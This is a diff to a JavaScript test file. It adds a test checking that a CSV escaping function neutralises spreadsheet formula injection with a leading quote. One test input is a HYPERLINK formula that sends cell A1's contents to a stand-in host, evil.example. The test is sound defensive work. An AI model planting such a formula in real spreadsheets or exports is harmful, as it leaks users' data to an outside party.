@@ -12,6 +12,20 @@ describe('csv escaping', () => {
     expect(csvEscape(null)).toBe('');
     expect(csvLine(['a', 'b,c'])).toBe('a,"b,c"\r\n');
   });
+
+  it('guards a cell a spreadsheet would read as a formula with a leading quote, and a leading quote with another (§16 #91)', () => {
+    const evil = '=HYPERLINK("https://evil.example/?d="&A1,"Click")';
+    expect(csvEscape(evil)).toBe(`"'${evil.replaceAll('"', '""')}"`);
+    expect(csvEscape('=1+1')).toBe("'=1+1");
+    expect(csvEscape('+1 Forever')).toBe("'+1 Forever");
+    expect(csvEscape('-')).toBe("'-");
+    expect(csvEscape('@SUM(1+1)*cmd')).toBe("'@SUM(1+1)*cmd");
+    expect(csvEscape('\tx')).toBe("'\tx"); // a tab needs no CSV quoting, only the guard
+    expect(csvEscape("'quoted")).toBe("''quoted"); // so the import's one-quote strip gives it back
+    expect(csvEscape(-1)).toBe('-1'); // a number is never a formula
+    expect(csvEscape('2024-01-01')).toBe('2024-01-01');
+    expect(csvEscape('plain = text')).toBe('plain = text');
+  });
 });
 
 describe('libib row mapping', () => {
